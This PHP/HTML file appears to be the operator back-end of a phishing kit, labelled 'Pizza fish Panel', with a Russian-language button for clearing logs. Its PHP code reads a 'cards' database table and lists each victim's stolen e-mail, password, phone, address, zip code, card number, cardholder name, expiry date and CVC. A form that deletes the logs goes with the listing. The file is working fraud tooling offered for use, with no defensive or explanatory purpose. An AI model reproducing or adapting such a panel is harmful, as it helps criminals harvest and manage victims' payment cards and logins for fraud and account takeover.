<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Admin panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <script src="css/jquery-3.5.1.min.js"></script>
    <link rel="stylesheet" href="css/adminpanels.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap/css/bootstrap-theme.min.css">
    <link rel="stylesheet" type="text/css" href="css/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="fonts/stylesheet.css">
    <link rel="stylesheet" href="fonts/style.css">
    <script src="js/jquery-3.3.1/jquery-3.3.1.min.js"></script>
    <script src="js/bootstrap/bootstrap.min.js"></script>
    <script src="js/main.js"></script>
</head>

<body>
    <header>
        <div class="container">
            <div class="row">
                <div class="col-md-4 col-sm-4col-xs-12">
                    <div class="logo">
                        <h1>Pizza fish Panel</h1>

                    </div>
                </div>
                <div class="col-md-5 col-sm-4 col-xs-12">
                    <div class="button_nav">

                        <div class="delite_button">
                            <form action="delite.php" name="<?=$data['id']; ?>" method="POST">
                                <input type='submit' value='Очистить логи'>
                                
                                
                            </form>
                            <div class="col-md-4 col-sm-12 col-xs-12">
                                <div class="dowload_form">
                                <form class="" action="save_button.php" method="POST">
                               
                            </form>
                            </div>
                            </div>
                            
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <div class="content">
       <div class="contents_wrapper">
       </div>
        <div class="container">
            <div class="row">
                <div class="col-md-12 col-sm-12 col-xs-12">
                   <div class="logis">
                       <h1>logs</h1>
                   </div>
                    <div class="logs">
                        <?php 
include "bd.php";
                        
$n1="<p class=\"textst\">"."E-mail:"."</p>";
$n2="<p class=\"textst\">"."Password::"."</p>";      
                        $n4="<p class=\"textst\">"."Mobile:"."</p>";  
                        $n5="<p class=\"textst\">"."Address:"."</p>";  
                        $n6="<p class=\"textst\">"."Zip:"."</p>";  
                        $n7="<p class=\"textst\">"."cardNumber:"."</p>";  
                        $n8="<p class=\"textst\">"."cardHolder:"."</p>";  
                        $n9="<p class=\"textst\">"."cardMonth:"."</p>";  
                        $n10="<p class=\"textst\">"."cardYear:"."</p>"; 
                        $n11="<p class=\"textst\">"."cvc:"."</p>";  
$res_1 = mysqli_query($mysqli, "SELECT * FROM cards");

while ($res_2 = mysqli_fetch_row($res_1)) {
    echo $n1."<p class=\"text\">".$res_2[1]."</p>";
    echo $n2."<p class=\"text\">".$res_2[2]."</p>";
     echo $n4."<p class=\"text\">".$res_2[3]."</p>";
    echo $n5."<p class=\"text\">".$res_2[4]."</p>";
         echo $n6. "<p class=\"text\">".$res_2[5]."</p>.";
        echo $n7."<p class=\"text\">".$res_2[6]."</p>";
        echo $n8."<p class=\"text\">".$res_2[7]."</p>";
        echo $n9."<p class=\"text\">".$res_2[8]."</p>";
        echo $n10."<p class=\"text\">".$res_2[9]."</p>";
    echo $n11."<p class=\"texs\">".$res_2[10]."</p>";
    
    

    
}

?>


                    </div>
                </div>
                
            </div>
        </div>

    </div>
    <div class="container">
        <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">

            </div>
        </div>
    </div>
</body>

</html>